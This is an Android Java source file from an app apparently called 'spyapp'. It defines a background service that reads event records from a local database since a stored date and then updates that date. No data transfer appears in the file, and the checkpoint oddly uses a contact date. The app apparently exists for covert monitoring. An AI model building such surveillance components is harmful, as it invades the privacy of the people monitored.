package com.app.spyapp.servercall;

import android.app.IntentService;
import android.content.Intent;
import android.util.Log;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Const;
import com.app.spyapp.common.Pref;
import com.app.spyapp.model.EventModel;

import java.util.ArrayList;


public class EventListCallService extends IntentService {

    private SpyApp spyApp;

    public EventListCallService() {
        super(EventListCallService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        spyApp = (SpyApp) getApplicationContext();
        ArrayList<EventModel> eventList = spyApp.getDatabaseHelper().getEventList(spyApp.getSharedPreferences().getString(Pref.EVENT_LAST_UPDATEDATE, Const.INITDATETIME));
        spyApp.getSharedPreferences().edit().putString(Pref.EVENT_LAST_UPDATEDATE, spyApp.getDatabaseHelper().getMaxDateofContact()).apply();
        Log.i("Debug", "onHandleIntent: EventListCallService");
    }
}
